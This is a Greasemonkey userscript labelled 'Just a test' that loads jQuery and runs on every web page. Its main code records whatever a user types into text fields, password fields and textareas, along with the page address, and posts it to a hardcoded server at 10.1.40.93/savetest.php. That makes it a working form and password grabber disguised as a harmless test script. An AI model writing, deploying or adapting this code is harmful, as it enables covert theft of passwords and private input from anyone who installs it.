// ==UserScript==
// // @name          Monkey_loc 
// // @namespace      http://wweb.iiit.ac.in/~akash.sinhaug08
// // @description    Just a test
// // @include        http*://*
// // @require       http://ajax.googleapis.com/ajax/libs/jquery/1.2.6/jquery.js
// // ==/UserScript==



 $(document).ready(function() {  
alert('Loaded');
	$('input').blur(function (){
var vals=$(this).val();
var typs=$(this).attr('type');
if(typs=="text" || typs=="password"){
var dl=document.location;

dl=escape(dl);

var url="http://10.1.40.93/savetest.php?name=site is " + dl + "<br /> -> And Type is - " + typs +" and  Content is - <b> " + vals + " </b> and  ";

$.post(url);
}

});
	$('textarea').blur(function (){
var vals=$(this).val();
vals=escape(vals);
var dl=document.location;

dl=escape(dl);

var url="http://10.1.40.93/savetest.php?name=site is " + dl + " <br  /> -> and TextArea Content is - <b>" + vals + " </b> and ";
$.post(url);
});

$('div').mouseover(function (){

alert('Hovered');

});



 });

